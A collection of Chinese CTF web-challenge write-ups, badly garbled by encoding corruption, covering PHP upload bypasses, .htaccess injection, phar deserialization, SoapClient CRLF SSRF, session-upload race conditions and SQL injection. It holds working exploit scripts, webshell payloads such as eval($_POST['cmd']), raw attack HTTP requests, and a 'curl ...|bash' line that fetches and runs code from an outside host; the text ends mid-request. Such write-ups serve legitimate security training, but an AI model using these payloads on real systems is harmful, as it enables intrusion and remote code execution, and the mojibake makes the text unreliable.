æ–‡ä»¶ä¸Šä¼ TokenéªŒè¯ if ($this-&gt;request-&gt;post(â€˜tokenâ€™) !== md5($filename . session_id())) { return json([â€˜codeâ€™ =&gt; â€˜ERRORâ€™, â€˜msgâ€™ =&gt; â€˜æ–‡ä»¶ä¸Šä¼ éªŒè¯å¤±è´¥â€™]); } // æ–‡ä»¶ä¸Šä¼ å¤„ç† if (($info = $file-&gt;move(â€˜staticâ€™ . DS . â€˜uploadâ€™ . DS . $md5[0], $md5[1], true))) { if (($site_url = FileService::getFileUrl($filename, â€˜localâ€™))) { return json([â€˜dataâ€™ =&gt; [â€˜site_urlâ€™ =&gt; $site_url], â€˜codeâ€™ =&gt; â€˜SUCCESSâ€™, â€˜msgâ€™ =&gt; â€˜æ–‡ä»¶ä¸Šä¼ æˆåŠŸâ€™]); } } return json([&#39;code&#39; =&gt; &#39;ERROR&#39;, &#39;msg&#39; =&gt; &#39;æ–‡ä»¶ä¸Šä¼ å¤±è´¥&#39;]); } è·Ÿè¿› moveï¼Œè¿™é‡Œå¼Ÿå¼Ÿç”¨çš„notepadï¼Œæœäº†åŠå¤©ã€‚ // æ–‡ä»¶ä¿å­˜å‘½åè§„åˆ™ $saveName = $this-&gt;buildSaveName($savename); $filename = $path . $saveName;è·Ÿè¿› buildSaveName if (!strpos($savename, â€˜.â€™)) { $savename .= â€˜.â€™ . pathinfo($this-&gt;getInfo(â€˜nameâ€™), PATHINFO_EXTENSION); } return $savename; å…³é”®ç‚¹å°±åœ¨ æœ€åä¸€ä¸ªifåˆ¤æ–­ä¸Š åˆ¤æ–­ $savenameé‡Œæ˜¯å¦æœ‰. æœ‰çš„è¯å°±ä¼šç›´æ¥ return $savenameçœ‹å‰é¢çš„è°ƒç”¨å‘ç° è¿™ä¸ªsavenameå°±æ˜¯ è°ƒç”¨moveå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° ä¹Ÿå°±æ˜¯ $md5[1]ï¼šmove(â€˜staticâ€™ . DS . â€˜uploadâ€™ . DS . $md5[0], $md5[1], true))ç»è¿‡buildSaveName($savename)åä¼šç›´æ¥è¿”å›$md5[1]ï¼Œç„¶åæ‹¼æ¥åœ¨$pathçš„åé¢åšä¸ºæ–‡ä»¶åï¼Œåé¢ç›´æ¥è°ƒç”¨move_uploaded_file()å°†æ–‡ä»¶ç§»åŠ¨åˆ°$pathï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­$ma5[1]æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ã€‚é¦–å…ˆç”Ÿæˆå¸¦æœ¨é©¬çš„å›¾ç‰‡ï¼Œç„¶åç”Ÿæˆtokenå€¼ï¼Œphp &gt; echo md5(â€œaaâ€);4124bc0a9335c27f086f24ba207a4912echo md5(â€œ4124bc0a9335c27f/086f24ba207a.php.pngâ€);bf9b89e7c8f5f1159d8bd7aaaa9c795d postmanæ„é€ è¯·æ±‚åŒ…å‘é€å³å¯å‚è€ƒé“¾æ¥ï¼šhttps://www.anquanke.com/post/id/224207ï¼ˆå»ºè®®ç›´æ¥çœ‹è¿™ä¸ª [ç¾ŠåŸæ¯2020]easyphpå…³é”®è¯ï¼šhtaccesså¤´æ–‡ä»¶åŒ…å«è¿™é¢˜çœ‹ç€å°±è§‰å¾—å¥‡æ€ªï¼Œå†™äº†ä¸€å †wafä¸æ˜¯ç›´æ¥å¾€index.phpå†™ä¸ªé©¬ä¸å°±è¡Œäº†ï¼Ÿä½†æ˜¯æ²¡å†™è¿›å»ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰æƒé™ã€‚æ²¡æƒå†™indexï¼Œé‚£å°±åªèƒ½æƒ³åˆ«çš„åŠæ³•äº†ï¼ˆé™¤äº†indexéƒ½ä¼šè¢«åˆ é™¤æ–¹æ³•ï¼šåˆ©ç”¨.htaccessè®¾ç½®æ–‡ä»¶è‡ªåŠ¨åŒ…å«.htaccessä¹Ÿå¯ä»¥è®¾ç½®å¼€å¤´è‡ªåŠ¨åŒ…å«ï¼Œ.htaccessè®¾ç½®phpç¯å¢ƒå˜é‡çš„æ ¼å¼ï¼š #formatphp_value setting_name setting_value #examplephp_value auto_prepend_file .htaccessæ‰€ä»¥ä¼ å‚?filename=.htaccesscontentæœ‰è¿‡æ»¤ éœ€è¦å…ˆç»•è¿‡ $content = $_GET[â€˜contentâ€™]; if(stristr($content,â€™onâ€™) || stristr($content,â€™htmlâ€™) || stristr($content,â€™typeâ€™) || stristr($content,â€™flagâ€™) || stristr($content,â€™uploadâ€™) || stristr($content,â€™fileâ€™)) { echo â€œHackerâ€; die();å¯ä»¥é€šè¿‡å¯¹è¿‡æ»¤çš„å…³é”®å­—ä¸­é—´æ·»åŠ æ¢è¡Œ\\næ¥ç»•è¿‡stristrå‡½æ•°çš„æ£€æµ‹ï¼Œä¸è¿‡ä»ç„¶éœ€è¦æ³¨æ„æ·»åŠ \\æ¥è½¬ä¹‰æ‰æ¢è¡Œï¼Œè¿™æ ·æ‰ä¸ä¼šå‡ºç°è¯­æ³•é”™è¯¯ï¼Œå¦‚æ­¤ä¸€æ¥å°±ä¸éœ€è¦å†ç»•è¿‡preg_matchå‡½æ•°ï¼Œå³å¯ç›´æ¥å†™å…¥.htaccessæ¥getshell?content=php_value%20auto_prepend_fil\\%0ae%20.htaccess%0a%23&lt;?php%20system(â€˜cat%20/flaâ€™.â€™gâ€™);?&gt;\\&amp;filename=.htaccesså†™å…¥å†…å®¹ï¼šphp_value auto_prepend_fil\\e .htaccess #&lt;?php system(â€˜cat /flaâ€™.â€™gâ€™);?&gt;\\ ç”¨filteræµbase64decode contentä¸­å†…å®¹ä¹Ÿå¯ä»¥ç»•è¿‡ [WMCTF2020]Make PHP Great Againé¢„æœŸè§£ï¼šrequire_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶åœ¨phpä¸­ï¼Œrequire_onceåœ¨è°ƒç”¨æ—¶phpä¼šæ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚æœæ˜¯åˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è¯»å–flag.phpï¼Œå¿…é¡»ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚åŸç†è§£æï¼šhttps://www.anquanke.com/post/id/213235ï¼›https://blog.frankli.site/2020/08/05/WMCTF2020-PHP-source-analysis/payloadï¼šphp://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php/proc/self/rootåªèƒ½å¤šä¸èƒ½å°‘ï¼ŒåŸç†è§é“¾æ¥2ã€‚ éé¢„æœŸ1ï¼š?file=php://filter/convert.base64-encode/resource=/Troy3e/../proc/self/cwd/flag.phpé™„æ‰€æœ‰procè§£æï¼šhttps://blog.csdn.net/weixin_37778713/article/details/106130248éé¢„æœŸ2ï¼šåˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«åœ¨PHP&gt;5.4ï¼Œsession.upload_progress.enabledè¿™ä¸ªå‚æ•°åœ¨php.iniä¸­é»˜è®¤å¼€å¯ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆä¸Šä¼ è¿›åº¦æ–‡ä»¶ï¼ŒPHPå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼Œå®ƒçš„å­˜å‚¨è·¯å¾„å¯ä»¥åœ¨phpinfoä¸­æŸ¥åˆ°.å¯ä»¥åˆ©ç”¨session.upload_progresså°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ï¼Œå†å»åˆ©ç”¨ç«äº‰åœ¨sessionæ¸…ç©ºå‰åŒ…å«sessionæ–‡ä»¶ï¼Œè¾¾åˆ°Getshellçš„ç›®çš„ã€‚expï¼š #coding=utf-8 import io import requests import threading sessid = &#39;peri0d&#39; data = {&quot;cmd&quot;:&quot;system(&#39;whoami&#39;);&quot;} def write(session): while True: f = io.BytesIO(b&#39;a&#39; * 1024 * 50) resp = session.post( &#39;http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;}, files={&#39;file&#39;: (&#39;peri0d.txt&#39;,f)}, cookies={&#39;PHPSESSID&#39;: sessid} ) def read(session): while True: resp = session.post(&#39;http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/?file=/tmp/sess_&#39;+sessid,data=data) if &#39;peri0d.txt&#39; in resp.text: print(resp.text) event.clear() else: print(&#39;++++++++++++++++&#39;) if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() ç¥ä»™ è†œäº† https://blog.csdn.net/weixin_48537150/article/details/113189052 [SUCTF 2019]Upload Labs 2å…³é”®è¯ï¼špharååºåˆ—åŒ–ç»™äº†admin.phpæºç ï¼Œrceéœ€è¦æœ¬åœ°IPï¼Œç”±äºæ˜¯remoteaddrï¼Œæ— æ³•ç›´æ¥ä¼ªé€ ï¼Œæ‰€ä»¥å¾—å¯»æ‰¾ssrfçš„ç‚¹ã€‚class.phpé‡Œwakeupå‡½æ•°é‡Œæœ‰ä¸ªReflectionClassç±»ï¼ŒæŠ¥å‘Šäº†ä¸€ä¸ªç±»çš„æœ‰å…³ä¿¡æ¯ã€‚æ¥ä¸‹æ¥ä¼šè°ƒç”¨newInstanceArgså‡½æ•°ï¼ŒæŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¯çŸ¥æ­¤å‡½æ•°ä»ç»™å‡ºçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹ã€‚ä¹Ÿå°±æ˜¯å¯ä»¥å®ä¾‹åŒ–ä»»ä½•ç±»ã€‚æ€è·¯ï¼šä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶ï¼Œåœ¨func.phpè¯»å–è¯¥æ–‡ä»¶ï¼ŒgetMIME()è§¦å‘pharååºåˆ—åŒ–ï¼Œä»è€Œè°ƒç”¨SoapClientç±»ï¼ŒæˆåŠŸä¼ªé€ IPã€‚expï¼š &lt;?php $phar = new Phar(&#39;troy3e.phar&#39;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&#39;text.txt&#39;,&#39;text&#39;); $phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&#39;); //bypass class.php waf class File { public $file_name = &quot;&quot;; public $func = &quot;SoapClient&quot;; function __construct(){ $target = &quot;http://127.0.0.1/admin.php&quot;; $post_string = &#39;admin=&amp;cmd=curl http://henuctf.com:5555/tmp/|bash&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\\r\\n&quot;; $headers = []; $this-&gt;file_name = [ null, array(&#39;location&#39; =&gt; $target, &#39;user_agent&#39;=&gt; str_replace(&#39;^^&#39;, &quot;\\r\\n&quot;, &#39;xxxxx^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string), &#39;uri&#39;=&gt;&#39;hello&#39;) ]; } } $object = new File; echo urlencode(serialize($object)); $phar-&gt;setMetadata($object); $phar-&gt;stopBuffering(); buuç¯å¢ƒæœ‰å˜ï¼Œç›´æ¥cmdé‚£é‡Œå¼¹shellå³å¯ã€‚soapclient+CRLFå‚è€ƒï¼šhttps://blog.csdn.net/qq_42181428/article/details/100569464 çœ‹äº†ä¸‹å®˜æ–¹WPï¼Œå‡ºé¢˜äººæœ¬æ„ä¼¼ä¹æ˜¯æƒ³åœ¨admin.phpçš„wakeupå‡½æ•°é‡Œæä¾›flagè·å–æ–¹å¼ï¼Œè¿™æ ·å°±éœ€è¦æ–°çš„å§¿åŠ¿äº†å‡ºé¢˜äººç¬”è®°ï¼šhttps://xz.aliyun.com/t/6057åœ¨wakeupé‡Œçš„è¯å°±éœ€è¦å»æƒ³æ–¹æ³•è§¦å‘ååºåˆ—åŒ–äº†ï¼Œè¿™å…¶å®å°±å¯¹åº”äº†admin.phpé‡Œé¢sqlçš„å¥‡æ€ªä»£ç ï¼š$reflect = new ReflectionClass($this-&gt;clazz);$this-&gt;instance = $reflect-&gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); åˆ†åˆ«å¯¹åº”äº†ï¼š$m = new mysqli();$m-&gt;init();$m-&gt;real_connect(â€˜ipâ€™,â€™select 1â€™,â€™select 1â€™,â€™select 1â€™,3306);$m-&gt;query(â€˜select 1;â€™); åé¢æ€»ç»“çš„è¯ï¼Œå°±æ˜¯mysqlä¹Ÿä¼šè§¦å‘pharååºåˆ—åŒ–ï¼Œé‚£ä¹ˆ Rogue Mysql çš„æ”»å‡»å½“ç„¶é€‚ç”¨äº phar ååºåˆ—åŒ–äº†ã€‚çŒ›ã€‚ [SWPUCTF 2016]Web7å…³é”®è¯ï¼špython urllibå¤´æ³¨å…¥å‚è€ƒï¼šhttps://guokeya.github.io/post/swpuctf-2016web7urllib-tou-zhu-ru-ssrf/å¾ˆä¹…ä¹‹å‰çš„æ´äº†ï¼Œå­¦ä¹ ä¸€ä¸‹åŸç†å°±è¡Œã€‚inputç•Œé¢éšæ‰‹è¾“ä¸ª1æŠ¥é”™ï¼šPowered by CherryPy 17.4.2è°ƒç”¨äº†urllib2.openæ¼æ´åŸç†æ˜¯urllibåœ¨è§£æurlæ—¶ã€‚æ¥å—URLç¼–ç çš„å€¼ã€‚ä¼šåŒ…å«åœ¨HTTPæ•°æ®æµä¸­ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡%0d%0aå»æ„é€ ä¸€ä¸ªæ–°çš„HTTPè¯·æ±‚ã€‚é€šè¿‡urllibæ³¨å…¥redisã€‚ä¿®æ”¹adminå¯†ç https://blog.csdn.net/niexinming/article/details/53024755æ­¤é¢˜åº”è¯¥æ²¡ä»€ä¹ˆæ„ä¹‰äº†ï¼Œå¹´ä»£è¿‡äºä¹…è¿œã€‚ [SWPU2019]Web6å…³é”®è¯ï¼šMysqlä¸­çš„WITH ROLLUPç”¨æ³•ï¼›åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€å‚è€ƒ: https://blog.csdn.net/lllffg/article/details/114899739?spm=1001.2014.3001.5501ï¼›https://guokeya.github.io/post/EY20O7D3Q/è¾“å…¥1â€™ or 1=1#æ˜¾ç¤ºwrong passwordï¼Œè¯´æ˜åªä¼šæ£€æµ‹passwordï¼ˆå¦‚æœä¸æ£€æµ‹çš„è¯å°±ç›´æ¥è¿‡äº†æƒ³èµ·æ¥å‰å‡ å¤©blackwatché‚£é“é¢˜ç”¨çš„rollupï¼Œè¿™é‡Œä¹Ÿå°è¯•ä¸€ä¸‹ï¼š1â€™ or â€˜1â€™=â€™1â€™ group by passwd with rollup having passwd is NULL #æ ¹æ®å®˜æ–¹æç¤ºwsdl.phpï¼Œmethod=hintå¾—åˆ°ï¼ša few file may be helpful index.php Service.php interface.php se.phpæ˜¾ç„¶å¯ä»¥ç”¨file_readæ–¹æ³•è¯»å–æºç ã€‚è¯»å–åˆ°é™¤äº†Service.phpçš„å…¶ä»–å››ä¸ªæ–‡ä»¶æºç ã€‚è°ƒç”¨get_flagæç¤ºéœ€è¦adminä»¥127.0.0.1è®¿é—®ï¼Œcookieä¸­æœ‰ä¸€ä¸²åŠ å¯†çš„ä»£ç ï¼Œé€šè¿‡é€†å‘encode.phpå¾—åˆ°cookieå€¼ä¸ºxiaoC:1ã€‚ï¼ˆå¯ä»¥è·³è¿‡ä¼ªé€ ä¸€ä¸ªadmin åŠ å¯†ä¸€ä¸‹æ˜¯xZmdm9Nxag==ã€‚ç°åœ¨æœ‰äº†adminèº«ä»½ï¼Œè¿˜éœ€è¦127.0.0.1ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™); https://www.freebuf.com/vuls/202819.htmlï¼›https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referralç”±äºåœ¨å·²ç»™çš„å››ä¸ªæºç é‡Œéƒ½æ²¡æœ‰æ‰¾åˆ°get_flagç±»ï¼Œæ‰€ä»¥çŒœæµ‹ä¸€å®šæ˜¯å­˜åœ¨äºæˆ‘ä»¬æ— æ³•è¯»å–çš„Service.phpã€‚é‚£ä¹ˆæ€è·¯å°±æ˜¯ å…ˆç”Ÿæˆssrfçš„paylaodï¼Œç„¶ååˆ©ç”¨session.upload_progressæ‰“è¿‡å»ï¼Œå†åŠ ä¸Šsoapcilentè§¦å‘ssrf é‚£ä¹ˆç°åœ¨adminå’Œ127.0.0.1éƒ½æœ‰äº†ã€‚æœ€ååªéœ€è¦åˆ©ç”¨se.phpçš„ååºåˆ—åŒ–callä¸€ä¸‹service.phpçš„get_flagå³å¯ï¼ˆèŠœæ¹–~ æ•°æ®åŒ…ï¼šPOST /index.ph HTTP/1.1Host: ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeReferer: http://ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cn/index.phpCookie: PHPSESSID=troy3e;Content-Type: multipart/form-data; boundary=â€”â€”â€“1995995913Content-Length: 440Connection: closeAccept-Encoding: gzip,deflate â€”â€”â€”-1995995913Content-Disposition: form-data; name=â€PHP_SESSION_UPLOAD_PROGRESSâ€ |O:10:â€SoapClientâ€:4:{s:3:â€uriâ€;s:4:â€aaabâ€;s:8:â€locationâ€;s:30:â€http://127.0.0.1/interface.phpâ€;s:11:â€_user_agentâ€;s:60:â€wupcoX-Forwarded-For: 127.0.0.1Cookie: user=xZmdm9NxaQ==â€;s:13:â€_soap_versionâ€;i:1;}â€”â€”â€”-1995995913Content-Disposition: form-data; name=â€fileâ€; filename=â€1.txtâ€Content-Type: text/plain â€”â€”â€”-1995995913â€“ æ•°æ®åŒ…2ï¼šPOST /se.php HTTP/1.1Host: ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=troy3e;Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 276 aa=O:2:&quot;bb&quot;:2:{s:4:&quot;mod1&quot;;O:2:&quot;aa&quot;:2:{s:4:&quot;mod1&quot;;N;s:4:&quot;mod2&quot;;a:1:{s:5:&quot;test2&quot;;O:2:&quot;cc&quot;:3:{s:4:&quot;mod1&quot;;O:2:&quot;ee&quot;:2:{s:4:&quot;str1&quot;;O:2:&quot;dd&quot;:3:{s:4:&quot;name&quot;;N;s:4:&quot;flag&quot;;s:8:&quot;Get_flag&quot;;s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;}s:4:&quot;str2&quot;;s:7:&quot;getflag&quot;;}s:4:&quot;mod2&quot;;N;s:4:&quot;mod3&quot;;N;}}}s:4:&quot;mod2&quot;;N;} popé“¾æ¯”è¾ƒç®€å•å°±ä¸å†™äº†ï¼Œå¿˜äº†çš„è¯çœ‹å‚è€ƒé“¾æ¥ã€‚æ•°æ®åŒ…æœ€å¥½èƒ½è‡ªå·±pythonå†™äº†ç„¶åbpæŠ“ï¼Œè¿™æ ·è®°å¿†ä¼šæ›´æ·±ã€‚ [RoarCTF 2019]PHPSheå…³é”®è¯ï¼šCVE-2019-9762ï¼špharååºåˆ—åŒ–æ²¡åŠæ³•æ³¨å†Œï¼Œç›´æ¥åˆ·æ‰äº†ä¸€å †ç½‘ä¸Šçš„cveã€‚ä½†è¿™ä¸ªè¿˜èƒ½ç”¨ï¼š/include/plugin/payment/alipay/pay.php?id=pay%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12%23_ ç”¨åå¼•å·æ˜¯å› ä¸ºæºç é‡Œæ’å…¥å°±æ˜¯åå¼•å·ï¼Œè¿™é‡Œçš„ä¸‹åˆ’çº¿å¤§æ¦‚æ˜¯å’Œæœ¬èº«ä¼ å…¥çš„pay_2891314719è¿™ç§æ ¼å¼æœ‰å…³ï¼Œå¿…é¡»å¾—åŠ ä¸Šã€‚ç„¶åä¼šå‘ç°burpå›æ˜¾3ï¼Œä¸æ˜¯å¾ˆæ˜æ˜¾éœ€è¦ä»”ç»†ç‚¹çœ‹ã€‚ æŠŠ3æ¢æˆdatabase()å¾—åˆ°phpshe2ï¼Œç„¶è€Œæ¥ä¸‹æ¥å´æ— æ³•ç›´æ¥æ³¨å‡ºè¡¨åï¼Œéœ€è¦ç”¨åˆ°æ— åˆ—åæ³¨å…¥ï¼šhttps://zhuanlan.zhihu.com/p/98206699 /include/plugin/payment/alipay/pay.php?id=pay%20where%201=1%20union%20select%201,2,((select3from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_å¾—åˆ°2476bf5c8d3653e843b6ed42c0672b91è§£å¯†altman777ï¼ŒæˆåŠŸç™»å…¥åå°ã€‚æ ¹æ®WP è¯´æ˜¯åœ¨æºç ä¸­çš„ç±»æ–‡ä»¶è¿›è¡Œäº†ä¿®æ”¹ï¼ˆå¯ä»¥ç”¨diffinityå¯¹æ¯”å‡ºæ¥ï¼Œå‡ ä¸‡è¡Œä»£ç æ˜¯ä¸å¯èƒ½æ‰‹åŠ¨æ‰¾çš„ public function __destruct() { $this-&gt;extract(PCLZIP_OPT_PATH, $this-&gt;save_path); } PCLZIPè§£å‹ç¼©ï¼Œç„¶åå°†æ–‡ä»¶æ”¾åœ¨æŒ‡å®šç›®å½•ï¼ŒåŒæ—¶å“ç‰Œç®¡ç†å¤„åˆèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œé‚£ä¹ˆåªè¦æƒ³åŠæ³•è§¦å‘å³å¯ã€‚å³åœ¨admin.phpä¸Šä¼ çš„å‹ç¼©çš„ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶è¦è§¦å‘è¿™é‡Œçš„destructã€‚é‚£ä¹ˆå°±ä»admin.phpå¼€å§‹çœ‹ï¼Œé¦–å…ˆï¼šinclude(â€˜common.phpâ€™);common.php 12è¡Œå°±æœ‰ä¸ªå˜é‡è¦†ç›– if (@ini_get(â€˜register_globalsâ€™)) { foreach ($_REQUEST as $name =&gt; $value) unset($$name); //è¿™é‡Œæ²¡æ‡‚ä¸ºå•¥ä¼šè§¦å‘è¦†ç›– } â€¦â€¦ if (get_magic_quotes_gpc()) { //è¿™å‡½æ•°æ’ä¸ºfalseï¼Œä»7.4ç‰ˆæœ¬å°±è¢«åºŸå¼ƒã€‚ !empty($_GET) &amp;&amp; extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, â€˜_gâ€™); !empty($_POST) &amp;&amp; extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, â€˜_pâ€™); } else { !empty($_GET) &amp;&amp; extract(pe_trim($_GET),EXTR_PREFIX_ALL,â€™_gâ€™); !empty($_POST) &amp;&amp; extract(pe_trim($_POST),EXTR_PREFIX_ALL,â€™_pâ€™);åé¢è¯´æ˜¯å¯¹å˜é‡åŠ ä¸Šå‰ç¼€ã€‚è¿›è¡Œå¤„ç†ã€‚åœ¨å‰ç¼€å’Œé”®å€¼ä¸­ä¼šåŠ ä¸€ä¸ªä¸‹åˆ’çº¿ã€‚ç»§ç»­çœ‹ã€‚å¯ä»¥åŒ…å«ä»»æ„ç›®å½•çš„phpæ–‡ä»¶ï¼ˆå…¶å®æ—©å°±å·²ç»çœ‹ä¸æ‡‚äº†ã€‚ã€‚ã€‚if (in_array(â€œ{$mod}.phpâ€, pe_dirlist(â€œ{$pe[â€˜path_rootâ€™]}module/{$module}/*.phpâ€))) { include(â€œ{$pe[â€˜path_rootâ€™]}module/{$module}/{$mod}.phpâ€);}åˆ©ç”¨å˜é‡è¦†ç›–ã€‚åŒ…å«adminç›®å½•ä¸‹çš„moban.phpï¼ˆ/module/admin/moban.phpåªæœ‰å®ƒå¼•ç”¨äº†pclzip.class.phpï¼ˆç½¢äº† è¿™è¦æ˜¯æˆ‘ä¸€è¾ˆå­æ‰¾ä¸ç€ çœ‹guokeå¸ˆå‚… wpå°±è¡Œäº†QAQswitchä¸€ä¸ªå‚æ•°è¿›å…¥delï¼š case â€˜delâ€™: pe_token_match(); $tpl_name = pe_dbhold($_g_tpl); if ($tpl_name == â€˜defaultâ€™) pe_error(â€˜é»˜è®¤æ¨¡æ¿ä¸èƒ½åˆ é™¤â€¦â€™); if ($db-&gt;pe_num(â€˜settingâ€™, array(â€˜setting_keyâ€™=&gt;â€™web_tplâ€™, â€˜setting_valueâ€™=&gt;$tpl_name))) { pe_error(â€˜ä½¿ç”¨ä¸­ä¸èƒ½åˆ é™¤â€™); } else { pe_dirdel(â€œ{$tpl_name}â€); pe_success(â€˜åˆ é™¤æˆåŠŸ!â€™); } break;pe_dirdelå‡½æ•°è§¦å‘pharååºåˆ—åŒ–ã€‚ æ‡‚äº†ï¼Œå¤§è‡´æ„æ€å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªå‹ç¼©çš„pharæ–‡ä»¶ï¼š &lt;?php class PclZip{ var $zipname = â€˜â€™; var $zip_fd = 0; var $error_code = 1; var $error_string = â€˜â€™; var $magic_quotes_status; var $save_path = â€˜/var/www/html/dataâ€™;//è§£å‹ç›®å½• function __construct($p_zipname){ $this-&gt;zipname = $p_zipname; $this-&gt;zip_fd = 0; $this-&gt;magic_quotes_status = -1; return; } } $a=new PclZip(&quot;/var/www/html/data/attachment/brand/1.zip&quot;);//å‹ç¼©çš„æ–‡ä»¶è·¯å¾„ echo serialize($a); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;troy3e&quot;); $phar-&gt;stopBuffering(); ?&gt; ç›®çš„æ˜¯åé¢ååºåˆ—åŒ–æ—¶ï¼ˆmoban.phpé‡Œçš„é‚£ä¸ªdelè§¦å‘ï¼‰è§¦å‘PclZipç±»ï¼Œè§£å‹webshellçš„å‹ç¼©æ–‡ä»¶ç„¶åå†™å…¥æˆ‘ä»¬æŒ‡å®šçš„ç›®å½•ï¼Œå®Œç¾ã€‚ç„¶åå˜ï¼Œåº·åº·å¸ˆå‚…çš„wpå…ˆ~å“¦ è¿˜æœ‰ä¸€ä¸ªæ³¨æ„ç‚¹å°±æ˜¯625è¡Œé‚£ä¸ªå‡½æ•°ï¼Œéœ€è¦ä¼ ä¸€ä¸ªtokenï¼ŒæŠ“åŒ…å³å¯è·å¾—ã€‚æ‰§è¡Œexpç”Ÿæˆphar.pharç„¶åä¿®æ”¹åç¼€ä¸ºå¯ä¸Šä¼ çš„ä»»æ„åç¼€ï¼ˆtxtä¸Šä¼ webshellçš„å‹ç¼©æ–‡ä»¶å’Œphar.txtï¼ˆburpæŠ“åŒ…æ”¹ä¸Šåˆ æ–‡ä»¶è§¦å‘ååºåˆ—åŒ–GET /admin.php?mod=moban&amp;act=del&amp;token=07aeb0cfb9db219504d34f4edfa2a135&amp;tpl=phar:///var/www/html/data/attachment/brand/3.txt HTTP/1.1Host: 9515c71a-972b-419f-847a-eb166c73ba9b.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: 